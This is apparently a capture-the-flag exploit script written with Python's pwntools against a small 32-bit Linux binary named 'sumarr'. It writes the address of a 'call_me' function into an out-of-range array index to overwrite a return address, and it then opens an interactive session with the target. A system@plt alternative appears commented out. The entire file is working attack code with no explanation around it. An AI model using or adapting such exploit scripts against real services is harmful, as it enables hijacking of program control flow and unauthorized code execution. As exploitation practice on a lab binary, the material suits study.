#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import struct

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "127.0.0.1"
port = "8888"

if _local:
	r = process('./sumarr')
else:
	r = remote(host, port)

if _ATT:
	log.info('Waiting for attach...')
	raw_input()

def strToHexStr(i):
	return str(struct.unpack('I', i)[0])

# system_plt = 0x08048450
call_me = 0x080486ab

print r.recvuntil(':')
r.sendline('AAAA')

print r.recvuntil('>>')
r.sendline('2')
print r.recvuntil(':')
r.sendline(str(0x40 / 4 + 1))
print r.recvuntil(':')
# r.sendline(str(system_plt))
r.sendline(str(call_me))

print r.recvuntil('>>')
r.sendline('0')

r.interactive()